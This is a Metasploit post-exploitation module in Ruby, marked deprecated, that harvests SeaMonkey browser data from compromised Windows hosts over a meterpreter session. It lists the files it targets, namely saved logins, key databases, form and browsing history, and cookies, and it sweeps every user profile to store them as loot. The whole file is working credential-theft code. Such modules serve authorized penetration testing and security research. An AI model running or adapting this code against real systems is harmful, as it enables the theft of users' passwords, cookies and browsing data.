##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  include Msf::Exploit::Deprecated

  deprecated nil, 'The post/windows/gather/enum_browsers module now supersedes this module'

  ARTIFACTS =
    {
      application: 'seamonkey',
      app_category: 'browsers',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'logins.json',
          description: "Seamonkey's saved Username and Password ",
          credential_type: 'json',
          json_search: [
            {
              json_parent: "['logins']",
              json_children: [
                "['hostname']",
                "['usernameField']",
                "['passwordField']",
                "['encryptedUsername']",
                "['encryptedPassword']"
              ]
            }
          ]
        },
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'cert8.db',
          description: "Seamonkey's saved Username and Password",
          credential_type: 'database'
        },
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'key3.db',
          description: "Seamonkeys's saved Username and Password",
          credential_type: 'database'
        },
        {
          filetypes: 'web_history',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'formhistory.sqlite',
          description: "Seamonkey's History",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports seamonkey's Login data",
              sql_table: 'moz_formhistory',
              sql_column: 'fieldname, value'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'places.sqlite',
          description: "Seamonkey's History ",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports seamonkey's Login data",
              sql_table: 'moz_places',
              sql_column: 'url'
            },
            {
              sql_description: "Database Commands which exports seamonkey's Login data",
              sql_table: 'moz_inputhistory',
              sql_column: 'input'
            },
            {
              sql_description: "Database Commands which exports seamonkey's Login data",
              sql_table: 'moz_keywords',
              sql_column: 'keyword'
            }
          ]
        },
        {
          filetypes: 'cookies',
          path: 'AppData',
          dir: 'Mozilla',
          artifact_file_name: 'cookies.sqlite',
          description: "Seamonkey's Cookies",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports seamonkey's Login data",
              sql_table: 'moz_cookies',
              sql_column: 'baseDomain, host, name, path, value'
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Seamonkey Credential Gatherer',
        'Description' => %q{
          This module searches for seamonkey credentials on a Windows host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep completed'
  end
end
